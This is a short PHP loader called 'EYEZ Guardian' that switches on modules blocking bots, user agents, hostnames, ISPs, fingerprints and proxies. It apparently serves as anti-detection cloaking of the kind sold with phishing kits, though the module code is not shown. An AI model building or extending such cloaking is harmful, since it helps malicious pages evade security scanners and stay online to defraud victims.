<?php
/*
EYEZ Guardian 👁‍🗨
Created by https://t.me/eyezcorp
Support https://t.me/eyezhouse
*/
$eyez = parse_ini_file("./guardian/config.ini", true);
//  Antibots
$antibots_iprange = $eyez['antibots_iprange'];
if ($antibots_iprange == 'on') {
    require_once './guardian/antibot/antibots.php';
}
//  User-Agent Blocker
$anti_ua = $eyez['anti_ua'];
if ($anti_ua == 'on') {
    require_once './guardian/blockUA/ua.php';
}
//  Hostname blocker
$anti_hn = $eyez['anti_hn'];
if ($anti_hn == 'on') {
    require_once './guardian/blockHN/hn.php';
}
// ISP blocker
$anti_isp = $eyez['anti_isp'];
if ($anti_isp == 'on') {
    require_once './guardian/blockISP/isp.php';
}
// Fingerprints blocker
$anti_fingerprints = $eyez['anti_fingerprints'];
if ($anti_fingerprints == 'on') {
    require_once './guardian/fp/fingprin.php';
}
// Proxy/VPN blocker in dev
$anti_proxy = $eyez['anti_proxy'];
if ($anti_proxy == 'on') {
    require_once './guardian/proxy/proxy.php';
}
?>